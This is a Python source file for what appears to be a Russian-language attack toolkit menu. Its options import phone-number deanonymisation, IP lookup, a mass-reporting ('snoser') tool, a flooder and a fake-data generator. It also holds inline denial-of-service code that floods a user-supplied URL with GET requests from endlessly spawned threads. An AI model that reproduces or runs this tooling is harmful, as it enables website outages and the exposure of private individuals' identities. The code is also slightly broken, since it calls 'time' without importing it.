from colored import cprint # type: ignore
import os
from pystyle import Anime, Colors, Colorate, Center # type: ignore
from banner import banner
import threading
import requests
import faker
import colorama

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

print(Colorate.Horizontal(Colors.blue_to_white,Center.XCenter(banner)))
select = input(f'{COLOR_CODE["RED"]}[+]{COLOR_CODE["BOLD"]}Выбирай >{COLOR_CODE["RED"]} ')
if select == '1':
    from deanon import get_number
    database_file = 'Number.csv' 
    search_value = input(f'{COLOR_CODE["RED"]}[@]Введите номер:')
    get_number(database_file, search_value)
elif select == '2':
    from get_ip import get_ip
    get_ip()
elif select == '3':
    from RendySnoser import RendySnoser
    RendySnoser()
elif select == '4':
    from flude import flude
    flude()
elif select == '5':
    print(Colorate.Horizontal(Colors.red_to_purple, ("Enter url ↓")))

    def dos():
            try:
                url = input()
                os.system("cls||clear")
                while True:
                    print(
                        Colorate.Horizontal(
                            Colors.red_to_purple,
                            ("[!] {{FUCKING WEBSITE " + url + " }}"),
                        )
                    )
                    requests.get(url)
            except requests.exceptions.MissingSchema:
                print(
                    Colorate.Horizontal(
                        Colors.red_to_purple, ("[!] I think you forgot https://")
                    )
                )
                time.sleep(2)
                exit()

    while True:
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()

elif select == '6':
   from fakerr import fakerr
   fakerr()